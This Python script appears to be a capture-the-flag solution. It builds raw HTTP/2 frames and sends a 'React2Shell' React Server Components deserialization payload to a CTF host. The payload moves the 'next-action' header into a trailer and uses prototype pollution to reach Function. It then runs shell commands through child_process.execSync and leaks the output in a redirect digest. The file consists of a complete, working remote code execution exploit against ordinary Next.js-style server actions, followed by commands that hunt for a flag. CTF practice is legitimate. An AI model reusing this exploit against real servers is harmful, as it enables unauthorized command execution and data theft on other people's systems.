#!/usr/bin/env python3
"""
Final RCE attempt with working React2Shell + H2 trailers
"""
import socket, ssl, struct, time, re, base64
from urllib.parse import unquote
from hpack import Encoder

HOST = 'funicular-gm2cxozn.alfactf.ru'

def send_rce(cmd):
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    ctx.set_alpn_protocols(['h2'])

    raw = socket.create_connection((HOST, 443), timeout=15)
    sock = ctx.wrap_socket(raw, server_hostname=HOST)
    sock.sendall(b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n\x00\x00\x00\x04\x00\x00\x00\x00\x00")

    try:
        sock.settimeout(2)
        sock.recv(65536)
    except: pass
    sock.settimeout(15)

    boundary = "----WebKitFormBoundaryx8jO2oVc6SWP3Sad"
    # Simple command escaping
    cmd_escaped = cmd.replace("'", "\\'").replace('"', '\\"')

    prefix = f'var res=process.mainModule.require("child_process").execSync("{cmd_escaped}",{{timeout:5000}}).toString("base64");throw Object.assign(new Error("NEXT_REDIRECT"), {{digest:`NEXT_REDIRECT;push;/login?a=${{res}};307;`}});'

    part0 = '{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\\"then\\":\\"$B1337\\"}","_response":{"_prefix":"' + prefix + '","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}'

    body_parts = [
        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\nContent-Disposition: form-data; name=\"0\"\r\n\r\n{part0}\r\n",
        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\nContent-Disposition: form-data; name=\"1\"\r\n\r\n\"$@0\"\r\n",
        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\nContent-Disposition: form-data; name=\"2\"\r\n\r\n[]\r\n",
        "------WebKitFormBoundaryx8jO2oVc6SWP3Sad--"
    ]
    body = "".join(body_parts).encode()
    ct = f"multipart/form-data; boundary={boundary}"

    enc = Encoder()
    headers = enc.encode([
        (":method", "POST"), (":scheme", "https"), (":authority", HOST), (":path", "/"),
        ("content-type", ct), ("content-length", str(len(body))),
        ("trailer", "next-action")
    ])

    trailer = enc.encode([("next-action", "x")])

    sid = 1
    sock.sendall(struct.pack(">I", len(headers))[1:] + b"\x01\x04" + struct.pack(">I", sid) + headers)
    sock.sendall(struct.pack(">I", len(body))[1:] + b"\x00\x00" + struct.pack(">I", sid) + body)
    sock.sendall(struct.pack(">I", len(trailer))[1:] + b"\x01\x05" + struct.pack(">I", sid) + trailer)

    headers_recv = {}
    body_recv = b""
    end_time = time.time() + 15
    while time.time() < end_time:
        try:
            hdr = sock.recv(9)
            if len(hdr) < 9: break
            length, frame_type, flags = struct.unpack(">I", b"\x00" + hdr[0:3])[0], hdr[3], hdr[4]
            stream_id = struct.unpack(">I", hdr[5:9])[0] & 0x7FFFFFFF

            payload = b""
            while len(payload) < length:
                chunk = sock.recv(length - len(payload))
                if not chunk: break
                payload += chunk

            if frame_type == 1:  # HEADERS
                for header_name in [b"x-action-redirect", b"location"]:
                    if header_name in payload:
                        try:
                            pattern = header_name + rb"[^\x00]*\x00([^\x00]+)"
                            match = re.search(pattern, payload)
                            if match:
                                headers_recv[header_name.decode()] = match.group(1).decode()
                        except: pass
            elif frame_type == 0: body_recv += payload

            if stream_id == sid and (flags & 1): break
        except: break

    sock.close()
    return headers_recv, body_recv

def main():
    print("🔥 Final RCE Test - React2Shell + H2 Trailers")

    # Simple commands to test
    commands = [
        "whoami",
        "pwd",
        "ls /",
        "cat /flag",
        "find / -name '*flag*' -type f 2>/dev/null",
    ]

    for cmd in commands:
        print(f"\n[+] Testing: {cmd}")
        headers, body = send_rce(cmd)

        # Check headers for redirect
        rce_result = None
        for header_name in ["x-action-redirect", "location"]:
            if header_name in headers:
                header_val = headers[header_name]
                print(f"    {header_name}: {header_val}")

                match = re.search(r"/login\?a=([^;&]+)", header_val)
                if match:
                    try:
                        result_b64 = unquote(match.group(1))
                        result = base64.b64decode(result_b64).decode("utf-8", errors="ignore")
                        print(f"    ✅ RCE Result: {result}")
                        rce_result = result

                        if "alfa{" in result:
                            flag_match = re.search(r"alfa\{[^}]+\}", result)
                            if flag_match:
                                print(f"\n🎉 FLAG FOUND: {flag_match.group(0)}")
                                return

                    except Exception as e:
                        print(f"    ❌ Decode error: {e}")

        if not rce_result:
            # Check body for any clues
            body_str = body.decode("utf-8", errors="ignore")
            print(f"    Body size: {len(body)} bytes")

            # Look for digest
            if "digest" in body_str:
                digest_match = re.search(r"digest\":\"([^\"]+)", body_str)
                if digest_match:
                    print(f"    Digest: {digest_match.group(1)}")

if __name__ == "__main__":
    main()